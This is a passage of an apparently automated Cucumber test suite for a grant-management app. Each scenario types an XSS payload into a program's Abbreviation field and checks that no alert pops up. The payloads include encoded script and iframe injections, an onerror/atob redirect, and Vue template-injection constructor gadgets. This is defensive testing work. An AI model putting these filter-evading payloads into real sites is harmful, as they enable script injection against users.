      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301253 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | <script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301254 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                        | Field                |
      | <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301255 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                   | Field                |
      | <iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @201257 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                               | Field                |
      | <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301259 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301306 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | {{constructor.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301307 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <div v-html="''.constructor.constructor('alert(1)')()">a</div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301308 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <x v-html=_c.constructor('alert(1)')()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301312 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | <x v-if=_c.constructor('alert(1)')()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301315 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_c.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301317 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_v.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301319 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_s.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301322 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <p v-show="_c.constructor`alert(1)`()"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301323 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <x v-on:click='_b.constructor`alert(1)`()'>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301327 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <x v-bind:a='_b.constructor`alert(1)`()'> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301329 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x @[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301331 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
